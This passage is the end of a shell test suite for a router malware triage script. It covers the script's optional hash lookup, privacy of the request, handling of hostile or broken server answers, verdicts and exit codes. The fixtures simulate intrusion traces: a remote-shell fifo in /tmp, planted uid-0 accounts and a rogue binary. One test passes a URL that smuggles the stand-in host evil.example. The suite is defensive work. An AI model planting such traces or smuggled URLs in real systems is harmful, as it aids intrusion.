	expect "nothing listed for review has a fingerprint: no section, nothing sent" '[ $rc = 0 ] && grep -q "REVIEW  *tmp-file  */tmp/.dg" "$K/none.txt" && ! grep -q "Fingerprint check\|community list" "$K/none.txt" && [ "$(nreq)" = 0 ]'
	rmdir "$KL/tmp/.dg"
	# two files, and an account: the report carries it, the check never asks for it
	echo payload >"$KL/tmp/.dg"; echo other >"$KL/tmp/.lp"
	printf 'root:x:0:0:root:/root:/bin/ash\nop$er#\303\251:x:0:0::/root:/bin/ash\n' >"$KL/etc/passwd"
	lk --lookup --show-report >"$K/ok.txt"; rc=$?
	sed -n '/^== Fingerprint check/,/^== GoodCloud/p' "$K/ok.txt"
	expect "--lookup sends without asking: one request, as text/plain" '[ "$(nreq)" = 1 ] && [ "$(cat "$KS/type.1")" = text/plain ] && grep -q "^== Fingerprint check (optional)" "$K/ok.txt" && ! grep -q "Check them?" "$K/ok.txt"'
	# the request rebuilt from the report's review_items of the same run (--show-report)
	same=$(python3 - "$K/ok.txt" "$KS/req.1" "$V" <<'EOF'
import hashlib, json, sys
lines = open(sys.argv[1], encoding='utf-8', errors='replace').read().split('\n')
a = lines.index('   {'); b = lines.index('   }', a)
rep = json.loads('\n'.join(lines[a:b + 1]))
req = open(sys.argv[2], 'rb').read()
want = []
for it in rep['review_items']:
    if it['sha256'] and it['kind'] not in ('new-account', 'uid0-account'):
        l = hashlib.sha256((it['kind'] + ' ' + it['path']).encode()).hexdigest() + ' ' + it['sha256']
        if l not in want:
            want.append(l)
nonce = req.split(b'\n')[2][6:].decode('latin-1')
exp = ('csa-2026-01-lookup 1\nversion %s\nnonce %s\n' % (sys.argv[3], nonce) + ''.join(l + '\n' for l in want)).encode()
ok = req == exp and len(want) == 2 and len(nonce) == 32 and all(c in '0123456789abcdef' for c in nonce)
print('same' if ok else 'differs')
EOF
)
	expect "the request is the contract's, byte for byte, made from kind and path as the report carries them" '[ "$same" = same ]'
	expect "an account is in the report but never asked: its name could be guessed back from a hash" 'grep -q "\"path\": \"/etc/passwd name=oper uid=0 shell=/bin/ash pw=set\"" "$K/ok.txt" && ! grep -q "$(printf "%s" "uid0-account /etc/passwd name=oper uid=0 shell=/bin/ash pw=set" | sha256sum | cut -c1-64)" "$KS/req.1" && ! grep -q " $(sha256sum <"$KL/etc/passwd" | cut -c1-64)$" "$KS/req.1"'
	expect "no path and no name in clear in the request" '! grep -qE "tmp|passwd|oper|dg|lp|/" "$KS/req.1"'
	expect "all not known: nothing changes, the section says so" '[ $rc = 0 ] && grep -q "Answer received and checked (2026-11-24 16:40 UTC)." "$K/ok.txt" && grep -q "^   2 not known. Each answer stands under its finding below.$" "$K/ok.txt" && grep -q "Verdict: no gl-helper indicators found" "$K/ok.txt"'
	# the line two below a finding in the list: under its detail, the answer of the community list
	under() { awk -v f="$2" 'p == 2 { sub(/^ +/, ""); print; exit } p { p++ } $0 == f { p = 1 }' "$1"; }
	sec_line() { grep -n "^== $2" "$1" | head -n 1 | cut -d: -f1; }
	expect "2.61: the check comes before the list of findings, and each answer stands under its finding" '[ "$(sec_line "$K/ok.txt" "Fingerprint check")" -lt "$(sec_line "$K/ok.txt" Findings)" ] && [ "$(under "$K/ok.txt" "   REVIEW   tmp-file        /tmp/.dg")" = "community list: not known" ] && [ "$(under "$K/ok.txt" "   REVIEW   tmp-file        /tmp/.lp")" = "community list: not known" ] && [ "$(grep -c "community list: not known" "$K/ok.txt")" = 2 ]'
	expect "2.61: a finding that was not asked (an account) has no line of the community list" 'acc=$(grep "^   REVIEW   uid0-account" "$K/ok.txt" | head -n 1) && [ -n "$acc" ] && ! under "$K/ok.txt" "$acc" | grep -q "community list"'
	n0=$(nreq)
	lk --no-lookup >"$K/nolookup.txt"; rc0=$?
	expect "--no-lookup: no question, no section, nothing sent, no line of the community list in the findings" '[ $rc0 = 0 ] && ! grep -q "Fingerprint check\|community list" "$K/nolookup.txt" && [ "$(nreq)" = "$n0" ] && grep -q "^   REVIEW   tmp-file        /tmp/.dg" "$K/nolookup.txt"'
	lk >"$K/ask.txt"; rc=$?
	expect "no terminal and no --lookup: what would be sent, one line that --lookup checks, nothing sent" '[ $rc = 0 ] && grep -q "^== Fingerprint check (optional)" "$K/ask.txt" && grep -q "Not sent: no path, no content of a file, no device ID" "$K/ask.txt" && grep -q "Not checked: nothing was sent. To check them, run the script again with --lookup." "$K/ask.txt" && [ "$(nreq)" = "$n0" ] && ! grep -q "community list: " "$K/ask.txt" && [ "$(sec_line "$K/ask.txt" "Fingerprint check")" -lt "$(sec_line "$K/ask.txt" Findings)" ]'
	ktable tmp/.dg known_bad
	lk --lookup >"$K/bad.txt"; rc=$?
	sed -n '/^== Fingerprint check/,/^== GoodCloud/p;/^== Result/,/^== Next/p' "$K/bad.txt"
	expect "known_bad: a clean device is INFECTED, exit 1, by IOC lookup-bad, with a verdict of its own" '[ $rc = 1 ] && grep -q "KNOWN BAD      tmp-file        /tmp/.dg" "$K/bad.txt" && grep -q "Summary: IOC=1 " "$K/bad.txt" && grep -q "IOC      lookup-bad: a file listed for review that the community list knows as malware. --fix does NOT remove it." "$K/bad.txt" && grep -q "Verdict: INFECTED - a file listed for review is known malware (community list)" "$K/bad.txt"'
	expect "known_bad: nothing says --fix removes it or that gl-helper was found; the REVIEW lines stay" '! grep -q "fix removes it" "$K/bad.txt" && ! grep -q "gl-helper indicators found" "$K/bad.txt" && [ "$(grep -o "REVIEW=[0-9]*" "$K/bad.txt" | tail -n 1)" = "$(grep -o "REVIEW=[0-9]*" "$K/nolookup.txt" | tail -n 1)" ]'
	expect "known_bad: the next steps still say to reinstall" 'grep -q "known malware on the community list. --fix does not remove it" "$K/bad.txt" && grep -q "Reinstall the firmware" "$K/bad.txt"'
	expect "known_bad: the offer of the report does not say that nothing was found" '! grep -q "Nothing known was found" "$K/bad.txt" && grep -q "The script itself found no known traces, and the report says so." "$K/bad.txt"'
	expect "2.61: known_bad stands under its finding, the other answer under its own; the IOC is in the list too" '[ "$(under "$K/bad.txt" "   REVIEW   tmp-file        /tmp/.dg")" = "community list: known malware" ] && [ "$(under "$K/bad.txt" "   REVIEW   tmp-file        /tmp/.lp")" = "community list: not known" ] && grep -q "^   1 known as malware, 1 not known. Each answer stands under its finding below.$" "$K/bad.txt" && grep -q "^   IOC      lookup-bad      /tmp/.dg$" "$K/bad.txt" && [ "$(sec_line "$K/bad.txt" "Fingerprint check")" -lt "$(sec_line "$K/bad.txt" Findings)" ]'
	codebits "$K/nolookup.txt"; codebits "$K/bad.txt"
	expect "known_bad: the field for review in the result code is 2, the rest as without the check" '[ "$(codebits "$K/bad.txt")" = "$(codebits "$K/nolookup.txt" | awk "{ print \$1, \$2, 2, \$4 }")" ] && codebits "$K/nolookup.txt" | grep -q " 1 1$"'
	ktable tmp/.dg known_safe
	lk --lookup >"$K/safe.txt"; rc=$?
	expect "known_safe: verdict, exit code, REVIEW count and result code stay; the list knowing it is said" '[ $rc = 0 ] && grep -q "Verdict: no gl-helper indicators found" "$K/safe.txt" && [ "$(grep -o "Summary: .*" "$K/safe.txt")" = "$(grep -o "Summary: .*" "$K/nolookup.txt")" ] && [ "$(codebits "$K/safe.txt")" = "$(codebits "$K/nolookup.txt")" ] && [ "$(under "$K/safe.txt" "   REVIEW   tmp-file        /tmp/.dg")" = "community list: probably safe, not a proof" ] && [ "$(under "$K/safe.txt" "   REVIEW   tmp-file        /tmp/.lp")" = "community list: not known" ] && grep -q "^   1 probably safe, 1 not known. Each answer stands under its finding below.$" "$K/safe.txt" && grep -q "The community list has 1 of them as probably safe" "$K/safe.txt" && grep -q "probably safe: marked so by the maintainers, or part of a known release. Not a proof:" "$K/safe.txt" && ! grep -q "lookup-bad" "$K/safe.txt"'
	# a trace the script found itself: the remote shell's pipe
	mkfifo "$KL/tmp/f"
	ktable tmp/.dg known_safe tmp/.lp known_safe
	lk --lookup >"$K/ioc.txt"; rc=$?
	expect "a trace found on the device stays: known_safe for every file, still INFECTED, exit 1" '[ $rc = 1 ] && grep -q "Summary: IOC=1 " "$K/ioc.txt" && grep -q "Verdict: INFECTED - gl-helper indicators found" "$K/ioc.txt"'
	ktable tmp/.dg known_bad
	lk --lookup >"$K/ioc2.txt"; rc=$?
	expect "with a trace of its own, the verdict stays and known_bad adds a line to it" '[ $rc = 1 ] && grep -q "Summary: IOC=2 " "$K/ioc2.txt" && grep -q "Verdict: INFECTED - gl-helper indicators found" "$K/ioc2.txt" && grep -q "Also: a file listed for review is known malware (community list)." "$K/ioc2.txt" && ! grep -q "Verdict: INFECTED - a file listed" "$K/ioc2.txt"'
	rm "$KL/tmp/f"
	# the attack reached the device (an empty mp_ip_mapping_info, AstroWarp off) and a file is
	# known malware: the verdict must not say that no malware files were found (review of 2.60)
	: >"$KL/etc/mp_ip_mapping_info"
	lk --lookup >"$K/att.txt"; rc=$?
	expect "ATTACKED and known malware: INFECTED by the community list, the attack added, as the page reads the code" '[ $rc = 1 ] && grep -q "Verdict: INFECTED - a file listed for review is known malware (community list)" "$K/att.txt" && grep -q "Also: the attack reached this device" "$K/att.txt" && ! grep -q "Verdict: ATTACKED\|No malware files" "$K/att.txt" && ! grep -q "Also: a file listed for review" "$K/att.txt" && [ "$(codebits "$K/att.txt" | cut -d " " -f 3)" = 2 ]'
	rm "$KL/etc/mp_ip_mapping_info"
	# more than 40 listed for review: the check says how many it left out (review of 2.60)
	cp "$KL/etc/passwd" "$K/passwd"
	i=1; while [ $i -le 45 ]; do echo "u$i:x:0:0::/root:/bin/ash" >>"$KL/etc/passwd"; i=$((i + 1)); done
	lk --lookup >"$K/many.txt"; rc=$?
	expect "more than 40 listed for review: programs first and asked, and a line for the rest" '[ $rc = 1 ] && grep -q "KNOWN BAD      tmp-file        /tmp/.dg" "$K/many.txt" && grep -q "Left out of the report and this check: 8 more findings listed for review (both take 40, programs first)." "$K/many.txt"'
	cp "$K/passwd" "$KL/etc/passwd"
	# 45 hidden files in the overlay sort before new-binary and tmp-file by kind: programs and
	# /tmp come first all the same (review of 2.60)
	mkdir -p "$KL/usr/bin" "$KL/overlay/upper/etc" "$KL/overlay/upper/usr/bin"
	i=1; while [ $i -le 45 ]; do echo $i >"$KL/etc/.h$i"; cp "$KL/etc/.h$i" "$KL/overlay/upper/etc/.h$i"; i=$((i + 1)); done
	{ printf '\177ELF'; head -c 200 /dev/urandom; } >"$KL/usr/bin/zz"; chmod +x "$KL/usr/bin/zz"; cp -p "$KL/usr/bin/zz" "$KL/overlay/upper/usr/bin/zz"
	cp "$KS/table" "$K/table.keep"; echo "$(sha256sum <"$KL/usr/bin/zz" | cut -c1-64) known_bad" >>"$KS/table"
	lk --lookup >"$K/rank.txt"; rc=$?
	expect "more than 40, hidden files sorting first by kind: the new program and the file in /tmp are still asked" '[ $rc = 1 ] && grep -Eq "KNOWN BAD +new-binary +/usr/bin/zz" "$K/rank.txt" && grep -Eq "KNOWN BAD +tmp-file +/tmp/.dg" "$K/rank.txt" && grep -Eq "Left out of the report and this check: [0-9]+ more findings listed for review" "$K/rank.txt"'
	cp "$K/table.keep" "$KS/table"; rm -rf "${KL:?}"/etc/.h* "${KL:?}/usr" "${KL:?}/overlay"
	# two programs from one deleted file: one question, counted once, said once, and the
	# answer under each of the two findings (review of 2.61)
	printf '\177ELF one more program' >"$KL/tmp/uj (deleted)"; mkdir -p "$KL/proc/1"; printf 'init\0' >"$KL/proc/1/cmdline"
	for p in 6001 6002; do mkdir -p "$KL/proc/$p"; echo uj >"$KL/proc/$p/comm"; printf 'uj\0' >"$KL/proc/$p/cmdline"; ln -s '/tmp/uj (deleted)' "$KL/proc/$p/exe"; done
	cp "$KS/table" "$K/table.keep"; echo "$(sha256sum <"$KL/tmp/uj (deleted)" | cut -c1-64) known_bad" >>"$KS/table"
	lk --lookup >"$K/twice.txt"; rc=$?
	sed -n '/^== Fingerprint check/,/^== GoodCloud/p' "$K/twice.txt" | grep -E 'files listed|known|KNOWN|deleted'
	asked=$(grep -o "whether the [0-9]* files listed for review below" "$K/twice.txt" | grep -o "[0-9][0-9]*")
	summed=$(grep "Each answer stands under its finding below" "$K/twice.txt" | grep -o "[0-9][0-9]* [a-z]" | awk '{ s += $1 } END { print s + 0 }')
	expect "two programs from one deleted file: asked and counted once, KNOWN BAD once, the answer under both findings" '[ $rc = 1 ] && [ -n "$asked" ] && [ "$asked" = "$summed" ] && [ "$(grep -c "KNOWN BAD      deleted-exe" "$K/twice.txt")" = 1 ] && (for p in 6001 6002; do [ "$(under "$K/twice.txt" "$(grep "^   REVIEW   deleted-exe     $p" "$K/twice.txt" | head -n 1)")" = "community list: known malware" ] || exit 1; done)'
	cp "$K/table.keep" "$KS/table"; rm -rf "${KL:?}/proc"; rm -f "$KL/tmp/uj (deleted)"
	# over HTTPS busybox's own wget is never used: it takes any certificate (review of 2.60)
	# app.gl-i.net is this machine here, where nothing listens on 443: a broken test sends nothing out
	n0=$(nreq); echo "127.0.0.1 app.gl-i.net" >"$KL/etc/hosts"
	TMPDIR=/tmp GL_TRIAGE_REPORT_URL=http://127.0.0.1:9/ chroot "$KL" /bin/sh /t.sh --no-device-id --lookup </dev/null >"$K/https.txt" 2>&1; rc=$?
	rm -f "$KL/etc/hosts"
	expect "over HTTPS with only busybox's wget: one line, nothing sent" '[ $rc = 0 ] && [ "$(nreq)" = "$n0" ] && grep -q "Not checked: no curl or wget here that checks the server.s certificate. Nothing was sent." "$K/https.txt" && ! grep -q "No answer from" "$K/https.txt"'
	# answers that do not fit, each with known_bad in the table: used, they would change the result
	ESC=$(printf '\033')
	for m in nonce unasked word missing extra order esc ctrl high big huge nolf crlf empty; do
		kmode $m; n0=$(nreq)
		lk --lookup >"$K/broken-$m.txt"; rc=$?
		expect "an answer that does not fit ($m) is set aside: one line, nothing changed, none of it printed" '[ $rc = 0 ] && [ "$(nreq)" -gt "$n0" ] && [ "$(grep -c "The answer did not check out and was not used. Nothing changed." "$K/broken-$m.txt")" = 1 ] && ! grep -qE "EVIL|lookup-bad|KNOWN BAD|known_|Answer received" "$K/broken-$m.txt" && ! grep -q "$ESC" "$K/broken-$m.txt" && grep -q "Verdict: no gl-helper indicators found" "$K/broken-$m.txt"'
	done
	kmode 500; n0=$(nreq)
	lk --lookup >"$K/500.txt"; rc=$?
	expect "an error of the server: one request, one line, nothing changed, exit code as before" '[ $rc = 0 ] && [ "$(nreq)" = "$((n0 + 1))" ] && [ "$(grep -c "No answer from the community list. Nothing changed." "$K/500.txt")" = 1 ] && grep -q "Verdict: no gl-helper indicators found" "$K/500.txt"'
	kmode slow; t0=$(date +%s)
	lk --lookup >"$K/slow.txt"; rc=$?; t1=$(date +%s)
	expect "an answer that trickles in: given up after 25 seconds, one line, nothing changed" '[ $rc = 0 ] && [ $((t1 - t0)) -lt 45 ] && [ "$(grep -c "No answer from the community list. Nothing changed." "$K/slow.txt")" = 1 ] && ! grep -q EEE "$K/slow.txt" && ! grep -q Terminated "$K/slow.txt"'
	kmode dribble; t0=$(date +%s)
	lk --lookup >"$K/dribble.txt"; rc=$?; t1=$(date +%s)
	expect "a header line every 8 seconds: the tool is stopped after 25 seconds, one line, nothing changed" '[ $rc = 0 ] && [ $((t1 - t0)) -lt 45 ] && [ "$(grep -c "No answer from the community list. Nothing changed." "$K/dribble.txt")" = 1 ] && ! grep -q Terminated "$K/dribble.txt"'
	kmode endless; t0=$(date +%s)
	lk --lookup >"$K/endless.txt"; rc=$?; t1=$(date +%s)
	expect "an answer without end: cut at 8193 bytes while it arrives, set aside at once" '[ $rc = 0 ] && [ $((t1 - t0)) -lt 15 ] && [ "$(grep -c "The answer did not check out and was not used. Nothing changed." "$K/endless.txt")" = 1 ] && ! grep -q EEE "$K/endless.txt"'
	kmode ok
	KURL=http://127.0.0.1:9/lookup lk --lookup >"$K/down.txt"; rc=$?
	expect "no server: one line, nothing changed, exit code as before" '[ $rc = 0 ] && [ "$(grep -c "No answer from the community list. Nothing changed." "$K/down.txt")" = 1 ] && grep -q "Verdict: no gl-helper indicators found" "$K/down.txt"'
	n0=$(nreq)
	lk --fix --lookup >"$K/fix.txt"; rc=$?
	expect "--fix never sends, and says that --lookup does nothing there" '[ $rc = 0 ] && [ "$(nreq)" = "$n0" ] && ! grep -q "Fingerprint check\|community list" "$K/fix.txt" && grep -q "lookup does nothing with --fix: the fingerprint check runs with --check and --archive." "$K/fix.txt"'
	mv "$KL/dev/urandom" "$K/urandom"; : >"$KL/dev/urandom"
	lk --lookup >"$K/emptyrand.txt"; rc=$?
	expect "an empty /dev/urandom: no fixed number goes out, one line, nothing sent" '[ $rc = 0 ] && [ "$(nreq)" = "$n0" ] && [ "$(grep -c "no random number could be made here (from /dev/urandom)" "$K/emptyrand.txt")" = 1 ]'
	rm "$KL/dev/urandom"
	lk --lookup >"$K/norand.txt"; rc=$?
	expect "without /dev/urandom: one line, nothing sent" '[ $rc = 0 ] && [ "$(nreq)" = "$n0" ] && [ "$(grep -c "no random number could be made here (from /dev/urandom)" "$K/norand.txt")" = 1 ]'
	mv "$K/urandom" "$KL/dev/urandom"
	rm -f "$KL"/tmp/gl-triage-*
	lk --archive --lookup >"$K/arch.txt"; rc=$?
	A=$(ls "$KL"/tmp/gl-triage-*.tar.gz 2>/dev/null | head -n 1)
	[ -n "$A" ] && tar -xzOf "$A" evidence/lookup.txt >"$K/lookup.txt" 2>/dev/null
	sed 's/^/    | /' "$K/lookup.txt"
	expect "--archive: lookup.txt holds the request as sent and the answer, the archive's report the finding" '[ $rc = 1 ] && cmp -s <(sed -n "/^Request, as sent to/,/^\$/p" "$K/lookup.txt" | sed "1d;\$d") "$KS/req.$(nreq)" && grep -qx "csa-2026-01-lookup-answer 1" "$K/lookup.txt" && grep -q " known_bad$" "$K/lookup.txt" && tar -xzOf "$A" evidence/report.txt | grep -q "IOC  *lookup-bad  */tmp/.dg"'
	rm -f "$KL"/tmp/gl-triage-*
	kmode esc
	lk --archive --lookup >"$K/arch2.txt"; rc=$?
	A=$(ls "$KL"/tmp/gl-triage-*.tar.gz 2>/dev/null | head -n 1)
	expect "--archive with an answer set aside: lookup.txt says so and holds none of it" '[ $rc = 0 ] && tar -xzOf "$A" evidence/lookup.txt | grep -q "did not check out and was set aside" && ! tar -xzOf "$A" evidence/lookup.txt | grep -qE "EVIL|answer 1|$ESC"'
	rm -f "$KL"/tmp/gl-triage-*
	kmode ok
	# triage-remote.sh through an ssh that runs the command in the chroot: known malware from
	# step 1 is not "clean" after --fix, which does not remove it
	mkdir -p "$K/fakessh"
	printf '#!/bin/bash\nexec env TMPDIR=/tmp GL_TRIAGE_REPORT_URL=http://127.0.0.1:9/ GL_TRIAGE_LOOKUP_URL=%s chroot %s /bin/sh -c "${!#}"\n' "$KURL" "$KL" >"$K/fakessh/ssh"
	chmod +x "$K/fakessh/ssh"
	PATH="$K/fakessh:$PATH" bash "$(dirname "$T")/triage-remote.sh" --fix --lookup -o "$K/ev" root@dev >"$K/remote.txt" 2>&1; rc=$?
	expect "triage-remote.sh --fix --lookup: known malware from the check ends as incomplete, with what to do" '[ $rc = 3 ] && grep -q "Verdict: INFECTED - a file listed for review is known malware" "$K/remote.txt" && grep -q "fix does not remove the file the community list knows as malware: reinstall the firmware" "$K/remote.txt" && grep -q "remediation incomplete" "$K/remote.txt"'
	rm -rf "${K:?}/ev" "${KL:?}"/tmp/gl-triage-*
	# step 1 gets no answer, step 2 (the archive's run) known malware: the device is not
	# clean (review of 2.60)
	echo 500 >"$KS/modes"
	PATH="$K/fakessh:$PATH" bash "$(dirname "$T")/triage-remote.sh" --lookup -o "$K/ev" root@dev >"$K/remote2.txt" 2>&1; rc=$?
	expect "triage-remote.sh --lookup: known malware that only step 2 finds counts: IOCs found, exit 1, with what to do" '[ $rc = 1 ] && grep -q "No answer from the community list" "$K/remote2.txt" && grep -q "IOCs found. Evidence saved." "$K/remote2.txt" && grep -q "fix does not remove the file the community list knows as malware" "$K/remote2.txt"'
	rm -rf "${K:?}/ev" "${KL:?}"/tmp/gl-triage-*
	# known malware next to a trace --fix leaves (the attack reached the device): incomplete,
	# not "fix exited with 1", and the line on what to do (review of 2.60)
	: >"$KL/etc/mp_ip_mapping_info"
	PATH="$K/fakessh:$PATH" bash "$(dirname "$T")/triage-remote.sh" --fix --lookup -o "$K/ev" root@dev >"$K/remote3.txt" 2>&1; rc=$?
	expect "triage-remote.sh --fix --lookup with a trace --fix leaves: incomplete, with what to do" '[ $rc = 3 ] && grep -q "Also: the attack reached this device" "$K/remote3.txt" && grep -q "fix does not remove the file the community list knows as malware: reinstall the firmware" "$K/remote3.txt" && grep -q "remediation incomplete" "$K/remote3.txt" && ! grep -q "fix exited with" "$K/remote3.txt"'
	rm -f "$KL/etc/mp_ip_mapping_info"; rm -rf "${K:?}/ev" "${KL:?}"/tmp/gl-triage-*
	# the connection drops during --fix: ssh's 255 becomes 4, an error, with what to do
	mkdir -p "$K/dropssh"
	printf '#!/bin/bash\ncase "${!#}" in *--fix*) exit 255 ;; esac\nexec "%s/fakessh/ssh" "$@"\n' "$K" >"$K/dropssh/ssh"
	chmod +x "$K/dropssh/ssh"
	PATH="$K/dropssh:$PATH" bash "$(dirname "$T")/triage-remote.sh" --fix --lookup -o "$K/ev" root@dev >"$K/remote4.txt" 2>&1; rc=$?
	expect "triage-remote.sh: a connection that drops during --fix ends as 4, with what to do" '[ $rc = 4 ] && grep -q "fix exited with 4" "$K/remote4.txt" && grep -q "reinstall the firmware" "$K/remote4.txt"'
	rm -rf "${K:?}/ev" "${KL:?}"/tmp/gl-triage-*
	lk --lookup --show-report >"$K/rep.txt"
	expect "the report knows nothing of the check" 'grep -q "Verdict: INFECTED - a file listed" "$K/rep.txt" && grep -q "^   \"ioc\": 0,$" "$K/rep.txt" && ! sed -n "/^== Anonymous report/,\$p" "$K/rep.txt" | grep -q lookup'
	# On a terminal it asks. The terminal comes from script(1), where it works here.
	n0=$(nreq)
	printf 'v\nn\n' | script -qec "env TERM=dumb TMPDIR=/tmp GL_TRIAGE_REPORT_URL=http://127.0.0.1:9/ GL_TRIAGE_LOOKUP_URL=$KURL chroot $KL /bin/sh /t.sh --no-device-id --no-report" /dev/null 2>/dev/null | tr -d '\r' >"$K/tty.txt"
	if grep -q "Check them? \[y/N, v = show what would be sent\]" "$K/tty.txt"; then
		sed -n '/^== Fingerprint check/,/^== GoodCloud/p' "$K/tty.txt"
		expect "on a terminal it asks; v shows the request line by line with the file under each, n sends nothing" '[ "$(nreq)" = "$n0" ] && grep -q "Not checked. Nothing was sent." "$K/tty.txt" && [ "$(sed -n "/^   What would be sent to/,/^   Under each line/p" "$K/tty.txt" | grep "^      [^ ]" | sed "s/^      //" | sed 1,3d)" = "$(sed 1,3d "$KS/req.$n0")" ] && grep -qx "      csa-2026-01-lookup 1" "$K/tty.txt" && grep -qx "         = tmp-file  /tmp/.dg" "$K/tty.txt" && ! grep -q "= uid0-account" "$K/tty.txt"'
		printf 'y\n' | script -qec "env TERM=dumb TMPDIR=/tmp GL_TRIAGE_REPORT_URL=http://127.0.0.1:9/ GL_TRIAGE_LOOKUP_URL=$KURL chroot $KL /bin/sh /t.sh --no-device-id --no-report" /dev/null 2>/dev/null | tr -d '\r' >"$K/tty2.txt"
		expect "y sends, and the answer is used" '[ "$(nreq)" = "$((n0 + 1))" ] && grep -q "KNOWN BAD      tmp-file        /tmp/.dg" "$K/tty2.txt"'
		printf 'v\nn\n' | script -qec "env TERM=dumb TMPDIR=/tmp GL_TRIAGE_REPORT_URL=http://127.0.0.1:9/ GL_TRIAGE_LOOKUP_URL=http://127.0.0.1:1@evil.example/ chroot $KL /bin/sh /t.sh --no-device-id --no-report" /dev/null 2>/dev/null | tr -d '\r' >"$K/tty3.txt"
		expect "an address of this machine with a user part (127.0.0.1:1@host) is not taken for the check" 'grep -q "What would be sent to https://app.gl-i.net/csa-2026-01-report/lookup, line by line:" "$K/tty3.txt" && ! grep -q evil.example "$K/tty3.txt"'
		# Ctrl-C at the question is a No, and the result still comes (review of 2.60). The driver
		# waits at most 2 seconds per read and 120 seconds in all, then stops the run.
		cat >"$K/drive.py" <<'EOF'
import os, pty, select, signal, sys, time
kl, url, trigger = sys.argv[1], sys.argv[2], sys.argv[3].encode()
env = dict(os.environ, TERM='dumb', TMPDIR='/tmp', GL_TRIAGE_REPORT_URL='http://127.0.0.1:9/', GL_TRIAGE_LOOKUP_URL=url)
pid, fd = pty.fork()
if pid == 0:
    os.execvpe('chroot', ['chroot', kl, '/bin/sh', '/t.sh', '--no-device-id', '--no-report'] + sys.argv[4:], env)
out, sent, end = b'', False, time.time() + 120
while time.time() < end:
    r = select.select([fd], [], [], 2)[0]
    if not r:
        continue
    try:
        d = os.read(fd, 4096)
    except OSError:
        break
    if not d:
        break
    out += d
    if not sent and trigger in out:
        time.sleep(float(os.environ.get('DRIVE_DELAY', '1.5')))
        os.write(fd, b'\x03')
        sent = True
if time.time() >= end:
    os.kill(pid, signal.SIGKILL)
st = os.waitpid(pid, 0)[1]
sys.stdout.write(out.decode('utf-8', 'replace').replace('\r', ''))
print('\nRC=%d' % (os.WEXITSTATUS(st) if os.WIFEXITED(st) else -1))
EOF
		n0=$(nreq)
		python3 "$K/drive.py" "$KL" "$KURL" 'Check them?' >"$K/intr.txt" 2>/dev/null
		expect "Ctrl-C at the question is a No: nothing sent, and the run goes on to its result" '[ "$(nreq)" = "$n0" ] && grep -q "Not checked. Nothing was sent." "$K/intr.txt" && grep -q "Verdict:" "$K/intr.txt" && grep -q "^RC=0$" "$K/intr.txt"'
		# Ctrl-C while it waits for the answer stops the check, and the result still comes
		kmode dribble; n0=$(nreq); t0=$(date +%s)
		python3 "$K/drive.py" "$KL" "$KURL" 'Ctrl-C stops it' --lookup >"$K/intr2.txt" 2>/dev/null; t1=$(date +%s)
		expect "Ctrl-C while waiting for the answer: stopped at once, nothing changed, the run goes on to its result" '[ "$(nreq)" = "$((n0 + 1))" ] && [ $((t1 - t0)) -lt 20 ] && grep -q "Stopped (Ctrl-C). Nothing changed." "$K/intr2.txt" && ! grep -q "No answer from the community list" "$K/intr2.txt" && grep -q "Verdict:" "$K/intr2.txt" && grep -q "^RC=0$" "$K/intr2.txt"'
		kmode dribble
		# Ctrl-C at once after the line that offers it: still only the check stops
		DRIVE_DELAY=0 python3 "$K/drive.py" "$KL" "$KURL" 'Ctrl-C stops it' --lookup >"$K/intr3.txt" 2>/dev/null
		kmode ok
		expect "Ctrl-C at once after the line that offers it: the check stops, not the run" 'grep -q "Stopped (Ctrl-C). Nothing" "$K/intr3.txt" && grep -q "Verdict:" "$K/intr3.txt" && grep -q "^RC=0$" "$K/intr3.txt"'
	else
		echo "  SKIP: the question on a terminal (script(1) gives no terminal here)"
	fi
	kill "$KSRV" 2>/dev/null
	umount "$KL/dev/null"
else
	echo "  SKIP: needs a statically linked busybox and python3"
fi

echo; echo "RESULT: $pass passed, $fail failed"
[ "$fail" = 0 ]
